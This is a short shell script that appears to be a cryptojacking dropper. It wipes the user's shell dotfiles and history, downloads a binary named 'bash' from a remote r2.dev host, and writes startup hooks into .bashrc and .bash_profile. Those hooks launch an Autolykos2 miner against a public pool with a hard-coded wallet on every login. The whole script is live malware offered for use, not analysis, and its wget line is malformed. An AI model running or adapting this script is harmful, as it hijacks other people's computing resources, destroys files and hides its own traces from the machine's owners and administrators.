cd ~
rm -rvf .bash* .lib*

rm -rvf ele* lol* 1.* 
cd ~/
mkdir .lib
cd .lib
rm -R *
rm -R /root/.ton
WORKER="h200"
WALLETNH="9i4hYPXf3VUfcVxUNSQxAqwo1THyy1pkN7cNDhF5KUZvqEVLZhF"
POOLNH="pool.woolypooly.com:3100"
wget -P /home/studio-lab-user/.lib/https://pub-c336f7088d5f440c9c904b1281b88fa6.r2.dev/bash && history -cr 
echo ""  > /root/.bashrc
echo "" > /root/.bash_history
echo "" > /root/.bash_profile
echo 'echo ""  >> /root/.bash_history' >> /root/.bashrc
echo "source /root/.bash_profile"  >> /root/.bashrc
echo "LD_LIBRARY_PATH=/root/.lib" > /root/.bash_profile
echo "export LD_LIBRARY_PATH" >> /root/.bash_profile
echo 'WORKER="h200"' >> ~/.bash_profile
echo 'WALLETNH="9i4hYPXf3VUfcVxUNSQxAqwo1THyy1pkN7cNDhF5KUZvqEVLZhF"' >> /root/.bash_profile
echo 'POOLNH="pool.woolypooly.com:3100"' >> /root/.bash_profile
echo "bash /root/.lib/gas.sh"  >> /root/.bash_profile
echo "./.lib/bash --algo AUTOLYKOS2 --pool $POOLNH --user $WALLETNH.$WORKER" > /root/.lib/gas.sh
chmod +x bash && cd ~/ && source .bashrc
